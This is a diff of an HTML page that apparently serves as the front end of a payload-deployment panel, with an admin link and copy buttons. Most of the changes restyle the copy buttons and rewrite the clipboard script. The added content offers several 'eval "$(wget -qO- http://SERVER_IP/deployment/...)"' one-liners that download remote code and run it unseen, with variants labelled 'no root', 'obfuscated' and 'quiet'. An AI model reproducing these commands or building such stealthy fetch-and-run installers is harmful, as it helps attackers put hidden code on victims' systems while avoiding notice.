@@ -48,12 +48,15 @@
             padding-bottom: 5px;
         }
         
+        .command-wrapper {
+            position: relative;
+            margin: 15px 0;
+        }
+        
         .command {
             background: rgba(0, 0, 0, 0.3);
             border: 1px solid var(--border);
             padding: 10px;
-            margin: 15px 0;
-            position: relative;
             overflow-x: auto;
             white-space: nowrap;
         }
@@ -67,7 +70,7 @@
             position: absolute;
             right: 10px;
             top: 7px;
-            background: transparent;
+            background: var(--bg);
             color: var(--secondary);
             border: 1px solid var(--border);
             border-radius: 3px;
@@ -75,11 +78,21 @@
             cursor: pointer;
             font-size: 12px;
             font-family: 'Courier New', monospace;
+            z-index: 10;
         }
         
         .copy-btn:hover {
             background: var(--hover);
             color: var(--text);
+        }
+        
+        /* Hidden textarea for copy functionality */
+        .hidden-textarea {
+            position: absolute;
+            left: -9999px;
+            top: 0;
+            height: 0;
+            opacity: 0;
         }
         
         .options {
@@ -138,6 +151,9 @@
     </style>
 </head>
 <body>
+    <!-- Hidden textarea for copying -->
+    <textarea id="copy-textarea" class="hidden-textarea"></textarea>
+    
     <div class="ascii-header">
 <pre>
  ____  __    ___  __  __ _  _  _  ____ 
@@ -151,9 +167,11 @@
 
     <h2>> deployment</h2>
     
-    <div class="command">
-        <span class="command-prompt">eval "$(wget -qO- http://SERVER_IP/deployment/y)"</span>
-        <button class="copy-btn" onclick="copyToClipboard('cmd1')">copy</button>
+    <div class="command-wrapper">
+        <div class="command">
+            <span class="command-prompt" id="cmd1">eval "$(wget -qO- http://SERVER_IP/deployment/full)"</span>
+        </div>
+        <button class="copy-btn" onclick="copyToClipboard('cmd1', this)">copy</button>
     </div>
     
     <div class="note">
@@ -164,34 +182,32 @@
     
     <div class="options">
         <div class="option-box">
-            <div class="option-title">> minimal</div>
-            <div class="command command-prompt">
-                eval "$(wget -qO- http://SERVER_IP/deployment/y)"
-                <button class="copy-btn" onclick="copyToClipboard('cmd2')">copy</button>
-            </div>
-        </div>
-        
-        <div class="option-box">
-            <div class="option-title">> user mode</div>
-            <div class="command command-prompt">
-                eval "$(wget -qO- http://SERVER_IP/deployment/y)"
-                <button class="copy-btn" onclick="copyToClipboard('cmd3')">copy</button>
+            <div class="option-title">> no root</div>
+            <div class="command-wrapper">
+                <div class="command">
+                    <span class="command-prompt" id="cmd2">eval "$(wget -qO- http://SERVER_IP/deployment/minimal)"</span>
+                </div>
+                <button class="copy-btn" onclick="copyToClipboard('cmd2', this)">copy</button>
             </div>
         </div>
         
         <div class="option-box">
             <div class="option-title">> obfuscated</div>
-            <div class="command command-prompt">
-                eval "$(wget -qO- http://SERVER_IP/deployment/y)"
-                <button class="copy-btn" onclick="copyToClipboard('cmd4')">copy</button>
+            <div class="command-wrapper">
+                <div class="command">
+                    <span class="command-prompt" id="cmd3">eval "$(wget -qO- http://SERVER_IP/deployment/x)"</span>
+                </div>
+                <button class="copy-btn" onclick="copyToClipboard('cmd3', this)">copy</button>
             </div>
         </div>
         
         <div class="option-box">
-            <div class="option-title">> one-liner</div>
-            <div class="command command-prompt">
-                eval "$(wget -qO- http://SERVER_IP/deployment/y)"
-                <button class="copy-btn" onclick="copyToClipboard('cmd5')">copy</button>
+            <div class="option-title">> quiet</div>
+            <div class="command-wrapper">
+                <div class="command">
+                    <span class="command-prompt" id="cmd4">eval "$(wget -qO- http://SERVER_IP/deployment/quiet)"</span>
+                </div>
+                <button class="copy-btn" onclick="copyToClipboard('cmd4', this)">copy</button>
             </div>
         </div>
     </div>
@@ -199,20 +215,35 @@
     <h2>> admin</h2>
     <a href="admin.php" class="admin-link">$ access admin panel</a>
     
+</body>
     <script>
-        function copyToClipboard(elementId) {
-            const el = document.querySelector(`#${elementId}`);
-            const text = el ? el.innerText.split('\n')[0].trim() : document.querySelector('.command-prompt').innerText.trim();
-            
-            navigator.clipboard.writeText(text).then(function() {
-                const btn = event.target;
-                const originalText = btn.innerText;
-                btn.innerText = "copied!";
-                setTimeout(() => {
-                    btn.innerText = originalText;
-                }, 1000);
-            });
+        function copyToClipboard(id, btn) {
+            const text = document.getElementById(id)?.textContent?.trim();
+            if (!text) return;
+
+            // Try modern clipboard API
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(text).then(() => showCopied(btn));
+            } else {
+                // Fallback using hidden textarea
+                const ta = document.getElementById('copy-textarea');
+                ta.value = text;
+                ta.style.display = 'block';
+                ta.select();
+                try {
+                    document.execCommand('copy');
+                    showCopied(btn);
+                } catch (e) {
+                    console.error('Copy failed', e);
+                }
+                ta.style.display = 'none';
+            }
+        }
+
+        function showCopied(btn) {
+            const t = btn.innerText;
+            btn.innerText = 'copied!';
+            setTimeout(() => btn.innerText = t, 1000);
         }
     </script>
-</body>
 </html>
